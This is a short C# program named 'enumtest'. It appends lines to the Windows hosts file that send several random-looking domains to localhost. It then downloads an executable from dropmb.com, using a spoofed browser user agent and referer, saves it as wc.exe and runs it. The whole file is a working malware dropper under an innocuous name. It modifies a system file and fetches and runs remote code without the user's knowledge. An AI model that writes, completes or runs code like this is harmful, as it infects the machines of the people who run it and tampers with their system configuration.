using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace enumtest;

internal class Program
{
	private static void Main()
	{
		using (StreamWriter streamWriter = File.AppendText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts")))
		{
			streamWriter.WriteLine("127.0.0.1 ayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf.com");
			streamWriter.WriteLine("127.0.0.1 iuqssfsodp9ifjaposdfjhgosurijfaewrwergwea.com");
			streamWriter.WriteLine("127.0.0.1 iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com");
			streamWriter.WriteLine("127.0.0.1 ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com");
			streamWriter.WriteLine("127.0.0.1 www.ayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf.com");
			streamWriter.WriteLine("127.0.0.1 www.iuqssfsodp9ifjaposdfjhgosurijfaewrwergwea.com");
			streamWriter.WriteLine("127.0.0.1 www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com");
			streamWriter.WriteLine("127.0.0.1 www.ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com");
		}
		using (WebClient webClient = new WebClient())
		{
			webClient.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0");
			webClient.Headers.Add(HttpRequestHeader.Host, "dropmb.com");
			webClient.Headers.Add(HttpRequestHeader.Referer, "https://dropmb.com/k69DC");
			webClient.DownloadFile("https://dropmb.com/files/0ed003160275dac09949e09ce39d4c82.exe", "wc.exe");
		}
		Process.Start("wc.exe");
	}
}
